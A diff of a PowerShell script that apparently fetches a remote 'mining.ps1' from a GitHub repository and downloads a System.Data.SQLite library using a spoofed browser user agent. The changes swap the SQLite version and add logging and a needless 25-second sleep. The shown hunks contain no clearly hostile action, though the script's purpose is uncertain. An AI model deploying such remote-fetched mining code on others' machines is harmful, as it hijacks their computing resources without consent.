@@ -18,8 +18,8 @@ $scriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining
 
 # URLs for downloading files
 $miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
-$sqliteDllUrl = "https://system.data.sqlite.org/downloads/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip"  # Updated to a valid version
 # Note: If this URL becomes invalid, check https://system.data.sqlite.org for the latest version and update accordingly.
+$sqliteDllUrl = "https://system.data.sqlite.org/downloads/1.0.117.0/sqlite-netFx46-binary-x64-2015-1.0.117.0.zip"
 
 # Add a flag for CPU mining (set based on your setup)
 $cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired
@@ -61,7 +61,10 @@ if (-not (Test-Path $dllPath)) {
     Write-Log "System.Data.SQLite.dll not found. Downloading and extracting from $sqliteDllUrl..."
     try {
         $zipPath = "$env:TEMP\sqlite.zip"
+        Write-Log "Starting download of System.Data.SQLite.dll..."
         $response = Invoke-WebRequest -Uri $sqliteDllUrl -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -PassThru -ErrorAction Stop
+        Write-Log "Download initiated. Waiting 25 seconds for completion..."
+        Start-Sleep -Seconds 25  # Wait 25 seconds to ensure download completes
         Write-Log "Download status code: $($response.StatusCode)"
         Write-Log "Content type: $($response.Headers['Content-Type'])"
 
